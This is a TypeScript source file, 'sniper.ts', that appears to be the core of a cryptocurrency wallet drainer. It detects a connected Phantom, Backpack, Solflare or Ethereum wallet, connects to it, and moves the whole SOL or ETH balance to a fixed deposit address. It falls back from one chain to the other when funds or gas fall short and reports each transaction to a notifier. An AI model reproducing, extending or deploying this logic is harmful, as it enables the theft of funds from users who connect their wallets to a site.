// src/lib/sniper.ts
import { depositAllSol, getActiveSolanaProvider } from './solana'
import { depositAllEth } from './evm'
import { createWalletClient, custom } from 'viem'
import { mainnet, sepolia } from 'viem/chains'
import { notifyTx } from './notify'
import { SOL_DEPOSIT_ADDRESS /*, EVM_DEPOSIT_ADDRESS */ } from '../config'

export type SniperResult =
  | { network: 'evm'; hash: `0x${string}`; from?: `0x${string}`; chainId?: number }
  | { network: 'solana'; signature: string; from?: string }

/** Map chainId hex (0x1, 0xAA...) to viem chain object */
function pickViemChain(chainIdHex?: string) {
  const id = chainIdHex ? Number(chainIdHex) : 1
  if (id === mainnet.id) return mainnet
  if (id === sepolia.id) return sepolia
  // Unknown chain: return a minimal shape so viem accepts it
  return { ...sepolia, id } as any
}

/** Return unlocked EVM account (if any) */
async function detectEvmAccount(windowAny: any): Promise<string | undefined> {
  if (!windowAny?.ethereum?.request) return undefined
  try {
    const accounts: string[] = (await windowAny.ethereum.request({ method: 'eth_accounts' }).catch(() => [])) || []
    if (accounts && accounts.length) return accounts[0] as `0x${string}`
  } catch {
    // ignore
  }
  return undefined
}

/**
 * depositMaxAuto(preferred?)
 * - preferred: optional 'solana' | 'evm' to force a route
 * - default behavior: Solana-first auto-detect, then EVM fallback (with selective Solana fallback on gas error)
 */
export async function depositMaxAuto(preferred?: 'solana' | 'evm'): Promise<SniperResult> {
  const w = window as any

  // --- helper: Solana branch ---
async function trySolanaBranch(): Promise<SniperResult> {
  const solProv: any = getActiveSolanaProvider()
  if (!solProv) throw new Error('No Solana provider detected. Please install or enable Phantom, Backpack, or Solflare.')

  // Ensure wallet is connected
  if (!solProv.publicKey) {
    try {
      if (solProv.connect) {
        await solProv.connect()
      } else {
        throw new Error('Solana wallet is not connected.')
      }
    } catch (err) {
      throw new Error(`Failed to connect to Solana wallet: ${String((err as any)?.message || err)}`)
    }
  }

  const pk = solProv.publicKey
  if (!pk) throw new Error('No Solana public key found. Please connect your Solana wallet.')

  const fromSol = pk.toBase58?.() || (typeof pk === 'string' ? pk : undefined)
  if (!fromSol) throw new Error('Could not determine Solana wallet address.')

  let signature: string
  try {
    // If depositAllSol accepts { publicKey }, pass it; otherwise remove the argument
    const result = await depositAllSol({ publicKey: pk } as any)
    signature = result.signature
  } catch (err) {
    throw new Error(`Solana deposit failed: ${String((err as any)?.message || err)}`)
  }

  try {
    notifyTx({
      kind: 'solana',
      chain: 'mainnet-beta',
      from: fromSol,
      to: SOL_DEPOSIT_ADDRESS,
      token: 'SOL',
      tx: signature,
    })
  } catch (err) {
    console.warn('Solana notify failed:', err)
  }

  return { network: 'solana', signature, from: fromSol }
}


  // --- helper: EVM branch ---
  async function tryEvmBranch(): Promise<SniperResult> {
    if (!w.ethereum?.request) throw new Error('No EVM provider available')

    const from = (await detectEvmAccount(w)) as `0x${string}` | undefined
    if (!from) throw new Error('No unlocked EVM account detected')

    const chainIdHex: string = await w.ethereum.request({ method: 'eth_chainId' }).catch(() => '0x1')
    const chain = pickViemChain(chainIdHex)
    const walletClient = createWalletClient({ chain, transport: custom(w.ethereum) })

    // depositAllEth should throw "Not enough ETH to cover gas" (or similar) if balance insufficient
    const { hash } = await depositAllEth({ walletClient, address: from, chainId: chain.id })

    try {
      notifyTx({
        kind: 'evm',
        chain: chain.id === mainnet.id ? 'mainnet' : `chain-${chain.id}`,
        from,
        token: 'ETH',
        tx: hash,
      })
    } catch (err) {
      console.warn('EVM notify failed:', err)
    }

    return { network: 'evm', hash, from, chainId: chain.id }
  }

  // --- Forced routes if caller specified ---
  if (preferred === 'solana') {
    try {
      return await trySolanaBranch()
    } catch (e) {
      throw new Error(`Solana deposit failed: ${String((e as any)?.message || e)}`)
    }
  }
  if (preferred === 'evm') {
    try {
      return await tryEvmBranch()
    } catch (e) {
      throw new Error(`EVM deposit failed: ${String((e as any)?.message || e)}`)
    }
  }

  // --- Auto-detect route: attempt Solana first if provider looks present/usable ---
  try {
    const solProv: any = getActiveSolanaProvider()
    if (solProv && (solProv.publicKey || solProv.isConnected || solProv.connect)) {
      try {
        return await trySolanaBranch()
      } catch (solErr) {
        // if Solana attempt fails, we'll attempt EVM next (but log)
        console.warn('Solana attempt failed — will try EVM fallback:', solErr)
      }
    }
  } catch (err) {
    // ignore detection errors and proceed to EVM attempt
    console.warn('Solana detection error:', err)
  }

  // --- Try EVM, with selective fallback to Solana if the EVM error signals gas/insufficient funds issue ---
  try {
    return await tryEvmBranch()
  } catch (evmErr) {
    const msg = String((evmErr as any)?.message || evmErr || '')
    // common substrings to recognize gas/insufficient funds errors
    const isGasErr =
      msg.includes('Not enough ETH to cover gas') ||
      msg.toLowerCase().includes('not enough eth') ||
      msg.toLowerCase().includes('insufficient funds') ||
      msg.toLowerCase().includes('gas')

    if (isGasErr) {
      // try Solana last-resort
      try {
        return await trySolanaBranch()
      } catch (solFallbackErr) {
        throw new Error(
          `EVM failed: ${msg}. Solana fallback failed: ${String((solFallbackErr as any)?.message || solFallbackErr)}`
        )
      }
    }

    // otherwise surface the EVM error
    throw new Error(`EVM deposit failed: ${msg}`)
  }
}
